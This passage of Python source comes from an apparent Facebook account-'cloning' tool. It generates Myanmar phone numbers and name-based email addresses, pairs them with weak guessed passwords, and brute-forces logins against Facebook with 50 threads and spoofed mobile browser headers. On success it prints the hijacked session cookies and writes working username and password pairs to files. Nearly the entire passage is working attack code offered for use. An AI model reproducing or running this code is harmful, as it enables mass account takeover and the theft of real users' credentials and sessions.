             'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
             'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.27"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
            lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[MKL-OK] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;36m'+coki+'\033[0;97m')
                print('\033[1;34m  >>>-----------------------------------------------➤')
                cek_apk(session,coki)
                open('/sdcard/MKL-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                print('\r\r\33[1;31m[MKL-CP] ' +uid+ ' | ' +ps+'')
                open('/sdcard/MKL-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s[MKL-M1]-[%s]-[%s]-[OK]-[%s]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
        
def M2():
    os.system('clear')
    print(logo)
    print(f"\033[1;31m[\033[1;96m1\033[1;31m] \033[1;32mRANDOM CLONING")   
    print(f"\033[1;31m[\033[1;96m2\033[1;31m] \033[1;32mGMAIL CLONING \033[1;36m(digitx 2)")   
    print(f"\033[1;31m[\033[1;96m3\033[1;31m] \033[1;32mGMAIL CLONING \033[1;36m(digitx 3)")   
    print(f"\033[1;31m[\033[1;96m4\033[1;31m] \033[1;32mGMAIL CLONING \033[1;36m(digitx 4)")   
    print(f"\033[1;31m[\033[1;96m5\033[1;31m] \033[1;32mUSER NAME CLONING")   
    print(f"\033[1;31m[\033[1;96m0\033[1;31m] \033[1;31mEXIT")
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    L = input(f'\033[1;32m[•] YOUR CHOICE : ')
    if L in ["1"]:
        L1()
    if L in ["2"]:
        L2()
    if L in ["3"]:
        L3()
    if L in ["4"]:
        L4()
    if L in ["5"]:
        L5()
    if L in ["0"]:
        os.system('exit')
        
def L1():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mATOM CODE      - \033[1;32m799 789 779 769 759')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mMPT CODE       - \033[1;32m429 419 409 259 269')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mOOREDOO CODE   - \033[1;32m989 979 969 959 949')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mMYTEL CODE     - \033[1;32m699 689 679 669 659')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    code = input('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32m SIM CODE : ')
    os.system('clear')
    print(logo)
    print('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32mCLONING LIMIT= 2000•5000•10000•15000•50000')
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    limit = int(input('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32mYOUR CLONING LIMIT : '))
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE CODE  : \033[1;32m'+code+'             ')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for love in user:
            uid = '09'+code+love
            pwx = [uid,love,code+love,code+love[:3],'myanmar','myanmar123','Myanmar','Myanmar123']
            morshed.submit(rcrack1,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     

def L2():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : @gmail.com , @yahoo.com')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    domain=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR DOMAIN : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,3))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+''+last+'.xx'+domain+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+last[0:1]+'.'+digitx+domain,first+last+'.'+digitx+domain,first[1:]+last[1:]+'.'+digitx+domain,last+first[0:1]+'.'+digitx+domain])
            pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack1,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     
    
def L3():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : @gmail.com , @yahoo.com')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    domain=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR DOMAIN : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+''+last+'.xxx'+domain+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+last[0:1]+'.'+digitx+domain,first+last+'.'+digitx+domain,first[1:]+last[1:]+'.'+digitx+domain,last+first[0:1]+'.'+digitx+domain])
            pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack1,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     
    
def L4():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : @gmail.com , @yahoo.com')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    domain=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR DOMAIN : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,5))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+''+last+'.xxxx'+domain+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+last[0:1]+'.'+digitx+domain,first+last+'.'+digitx+domain,first[1:]+last[1:]+'.'+digitx+domain,last+first[0:1]+'.'+digitx+domain])
            pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack1,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     
    
def L5():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+'.'+last+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+'.'+last[0:1]+'.'+digitx,first+'.'+last+'.'+digitx,first[1:]+'.'+last[1:]+'.'+digitx])
            pwx = ['u'+first+last,'mg'+first+last,'ko'+first+last,'daw'+first+last,'ma'+first+last,'oo'+first+last,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',first+last+'12345',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack1,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     

def rcrack1(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    try:
        for ps in pwx:
            pro = random.choice(ugen2)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
             "method": 'GET',
             "scheme": 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
             'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.27"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
            lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[MKL-OK] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;36m'+coki+'\033[0;97m')
                print('\033[1;34m  >>>-----------------------------------------------➤')
                cek_apk(session,coki)
                open('/sdcard/MKL-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                print('\r\r\33[1;31m[MKL-CP] ' +uid+ ' | ' +ps+'')
                open('/sdcard/MKL-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s[MKL-M2]-[%s]-[%s]-[OK]-[%s]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass       
        
        
def M3():
    os.system('clear')
    print(logo)
    print(f"\033[1;31m[\033[1;96m1\033[1;31m] \033[1;32mRANDOM CLONING")   
    print(f"\033[1;31m[\033[1;96m2\033[1;31m] \033[1;32mGMAIL CLONING \033[1;36m(digitx 2)")   
    print(f"\033[1;31m[\033[1;96m3\033[1;31m] \033[1;32mGMAIL CLONING \033[1;36m(digitx 3)")   
    print(f"\033[1;31m[\033[1;96m4\033[1;31m] \033[1;32mGMAIL CLONING \033[1;36m(digitx 4)")   
    print(f"\033[1;31m[\033[1;96m5\033[1;31m] \033[1;32mUSER NAME CLONING")   
    print(f"\033[1;31m[\033[1;96m0\033[1;31m] \033[1;31mEXIT")
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    mkl = input(f'\033[1;32m[•] YOUR CHOICE : ')
    if mkl in ["1"]:
        mkl1()
    if mkl in ["2"]:
        mkl2()
    if mkl in ["3"]:
        mkl3()
    if mkl in ["4"]:
        mkl4()
    if mkl in ["5"]:
        mkl5()
    if mkl in ["0"]:
        os.system('exit')
        
def mkl1():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mATOM CODE      - \033[1;32m799 789 779 769 759')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mMPT CODE       - \033[1;32m429 419 409 259 269')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mOOREDOO CODE   - \033[1;32m989 979 969 959 949')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mMYTEL CODE     - \033[1;32m699 689 679 669 659')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    code = input('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32m SIM CODE : ')
    os.system('clear')
    print(logo)
    print('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32mCLONING LIMIT= 2000•5000•10000•15000•50000')
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    limit = int(input('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32mYOUR CLONING LIMIT : '))
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE CODE  : \033[1;32m'+code+'             ')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for love in user:
            uid = '09'+code+love
            pwx = [uid,love,code+love,code+love[:3],'myanmar','myanmar123','Myanmar','Myanmar123']
            morshed.submit(rcrack2,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     

def mkl2():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : @gmail.com , @yahoo.com')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    domain=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR DOMAIN : ')
    os.system('clear')
    print(logo)
